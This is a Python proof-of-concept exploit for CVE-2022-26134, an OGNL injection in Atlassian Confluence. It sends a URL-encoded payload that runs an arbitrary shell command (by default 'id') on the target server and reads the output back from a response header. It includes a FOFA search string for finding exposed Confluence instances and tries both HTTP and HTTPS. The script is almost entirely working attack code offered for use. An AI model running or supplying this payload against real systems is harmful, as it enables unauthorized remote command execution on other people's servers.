# !/usr/bin/env python3
# _*_ coding:utf-8 _*_

import re
import sys
import argparse
import requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning


def title():
    print('+          FOFA:app="ATLASSIAN-Confluence"')


def run_proto(url):
    headers = {
        'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/72.0.3626.121 Safari/537.36',
    }

    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        requests.get("{}/login.action".format(url), verify=False, timeout=(6, 6))
        response = requests.get("{}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40"
                                "java.lang.Runtime%40getRuntime%28%29.exec%28%22{}%22%29.getInputStream%28%29%2C%22"
                                "utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%"
                                "29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/".
                                format(url, cmd), verify=False, headers=headers, allow_redirects=False, timeout=(6, 6))
        rec = re.search('uid(%3d|=).*?gid(%3d|=)', response.headers['X-Cmd-Response'], re.I)
        if rec or response.status_code == 302:
            print(url + '\t sExist\n\n\n\n')
            print(response.status_code)
            print(response.headers['X-Cmd-Response'])
            return True
        else:
            print(url + 'UExist')
            return False

    except Exception as e:
        print(e)
        return False


def run():
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}'.format(proto[i], target)
        if run_proto(url):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    parser = argparse.ArgumentParser(description="CVE-2022-26134")
    parser.add_argument('-t', '--target')
    parser.add_argument('-c', '--cmd', help='Execute command', default='id')
    args = parser.parse_args()
    target = args.target
    cmd = args.cmd
    if target is None or len(target) < 6:
        sys.exit('target is error')

    result = run()

    if result:
        print('Exist')
    else:
        print('UnExist')
